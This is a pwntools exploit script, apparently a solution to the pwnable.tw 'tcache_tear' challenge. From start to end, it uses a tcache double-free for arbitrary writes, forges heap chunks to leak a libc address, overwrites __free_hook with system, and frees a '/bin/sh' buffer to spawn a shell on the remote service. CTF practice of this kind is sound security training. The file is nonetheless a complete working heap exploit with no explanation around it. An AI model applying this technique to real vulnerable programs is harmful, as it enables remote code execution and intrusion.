#!/usr/bin/env python2
from pwn import *
from time import sleep

exe = ELF("./tcache_tear")
libc = ELF("./libc-2.27.so")
context.binary = exe
context.terminal = "wt.exe -- wsl.exe -d Ubuntu-20.04 -- ".split()
#context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"

global io
breakpoints = '''
break *0x400c07
continue
'''+"continue\n"*12

ip, port = "chall.pwnable.tw", 10207

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(ip, port)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)
    
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

name = 0x602060

def init(data):
    sla("Name:", data)

def malloc(size,data):
    sla("choice :", "1")
    sla("Size:", str(size))
    sla("Data:", data)

def free():
    sla("choice :", "2")

def info():
    sla("choice :", "3")
    reu("Name :")

def write(size,addr,data):
    malloc(size,"XXXX")
    free()
    free()
    malloc(size,p64(addr))
    malloc(size,p64(addr))
    malloc(size,data)

init("AAAA")

write(0x68,name+0x410,flat([
    0x0,
    0x21,
    0x0,0x0,
    0x0,
    0x21,
    0x0,0x0
    ]))

write(0x78,name-0x10,flat([
    0x0,
    0x421,
    "A"*40,
    name
    ]))

free()
info()

libc.address = unpack(re(6),48) - 0x3ebca0
log.info("Libc -> "+hex(libc.address))

write(0x38,libc.symbols["__free_hook"],p64(libc.symbols["system"]))
malloc(0x98,"/bin/sh\x00")
free()

io.interactive()